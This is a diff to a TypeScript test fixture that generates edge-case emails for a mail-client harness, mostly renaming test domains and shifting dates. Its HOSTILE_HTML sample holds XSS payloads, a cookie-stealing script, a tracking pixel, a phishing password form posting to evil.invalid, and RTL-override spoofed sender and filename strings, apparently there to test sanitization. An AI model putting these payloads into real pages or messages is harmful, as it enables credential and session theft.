@@ -1,3 +1,4 @@
+import { address, PEOPLE } from "../../lib/cast";
 import { pdf, png, truncate, zip } from "./binary";
 import {
   attachment,
@@ -14,8 +15,8 @@ import { randomBytes, words } from "./rng";
 
 const KB = 1024;
 const MB = 1024 * KB;
-const BASE_TIME = Date.UTC(2026, 8, 10, 8, 0, 0);
-const DOMAIN = "edge.harness.test";
+const BASE_TIME = Date.UTC(2024, 5, 10, 8, 0, 0);
+const DOMAIN = "edge.test";
 
 export interface MailCase {
   name: string;
@@ -29,7 +30,7 @@ function messageId(name: string, n = 0): string {
 function std(name: string, index: number, subject = name): Header[] {
   return [
     ["From", `Edge Sender <sender@${DOMAIN}>`],
-    ["To", "Ana Silva <ana@harness.test>"],
+    ["To", address(PEOPLE.ana)],
     ["Subject", subject],
     ["Date", new Date(BASE_TIME + index * 60_000).toUTCString()],
     ["Message-ID", messageId(name)],
@@ -129,18 +130,18 @@ function nestedEml(depth: number): Buffer {
 }
 
 const HOSTILE_HTML = `<html><head>
-<meta http-equiv="refresh" content="0;url=https://evil.harness.invalid/">
+<meta http-equiv="refresh" content="0;url=https://evil.invalid/">
 <style>body{background:url(javascript:alert(1))} *{animation:spin 0.001s infinite}</style>
 <script>document.cookie="stolen="+document.cookie</script>
 </head><body onload="alert(1)">
-<img src="https://tracker.harness.invalid/pixel.gif?id=ana" width="1" height="1">
+<img src="https://tracker.invalid/pixel.gif?id=ana" width="1" height="1">
 <img src="x" onerror="alert(2)">
-<iframe src="https://evil.harness.invalid/frame"></iframe>
-<form action="https://evil.harness.invalid/steal" method="post"><input name="password" type="password"><button>Verify account</button></form>
+<iframe src="https://evil.invalid/frame"></iframe>
+<form action="https://evil.invalid/steal" method="post"><input name="password" type="password"><button>Verify account</button></form>
 <a href="javascript:alert(3)">Click to confirm</a>
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg0KTwvc2NyaXB0Pg==">Open invoice</a>
 <svg onload="alert(5)"><circle r="10"/></svg>
-<object data="https://evil.harness.invalid/x.swf"></object>
+<object data="https://evil.invalid/x.swf"></object>
 <p style="display:none">hidden text</p>
 </body></html>`;
 
@@ -257,7 +258,7 @@ export const MAIL_CASES: MailCase[] = [
       html(
         "max-links-20k",
         19,
-        `<p>${Array.from({ length: 20_000 }, (_, i) => `<a href="https://links.harness.test/${i}">link ${i}</a>`).join(" ")}</p><a href="https://links.harness.test/${"x".repeat(64 * KB)}">64KB URL</a>`,
+        `<p>${Array.from({ length: 20_000 }, (_, i) => `<a href="https://links.edge.test/${i}">link ${i}</a>`).join(" ")}</p><a href="https://links.edge.test/${"x".repeat(64 * KB)}">64KB URL</a>`,
       ),
   },
 
@@ -369,7 +370,7 @@ export const MAIL_CASES: MailCase[] = [
     build: () =>
       plain("enc-rfc2047-broken", 33, "broken encoded words", [
         ["Subject", "=?utf-8?B?!!!not-base64!!!?= =?bogus?Q?x?= =?utf-8?Q?unterminated"],
-        ["From", "=?utf-8?B?8J+Ukg==?= <enc@edge.harness.test>"],
+        ["From", "=?utf-8?B?8J+Ukg==?= <enc@edge.test>"],
       ]),
   },
   {
@@ -406,7 +407,7 @@ export const MAIL_CASES: MailCase[] = [
             "Subject",
             "\u{202E}gnp.exe \u{1F469}\u{200D}\u{1F469}\u{200D}\u{1F467}\u{200D}\u{1F466} \u{645}\u{631}\u{62D}\u{628}\u{627}\u{200B}",
           ],
-          ["From", "\u{202E}evil\u{202C} <torture@edge.harness.test>"],
+          ["From", "\u{202E}evil\u{202C} <torture@edge.test>"],
         ],
       ),
   },
@@ -479,8 +480,8 @@ export const MAIL_CASES: MailCase[] = [
           `From: Second <second@${DOMAIN}>`,
           "Subject: first subject",
           "Subject: second subject",
-          "Date: Thu, 10 Sep 2026 09:00:00 +0000",
-          "Date: Fri, 11 Sep 2026 09:00:00 +0000",
+          "Date: Mon, 10 Jun 2024 09:00:00 +0000",
+          "Date: Tue, 11 Jun 2024 09:00:00 +0000",
           `Message-ID: ${messageId("mime-duplicate-headers")}`,
           "",
           "duplicate headers",
@@ -536,7 +537,7 @@ export const MAIL_CASES: MailCase[] = [
   {
     name: "date-tz-extremes",
     build: () =>
-      plain("date-tz-extremes", 53, "+1400 zone", [["Date", "Sat, 12 Sep 2026 23:59:59 +1400"]]),
+      plain("date-tz-extremes", 53, "+1400 zone", [["Date", "Wed, 12 Jun 2024 23:59:59 +1400"]]),
   },
   {
     name: "date-missing",
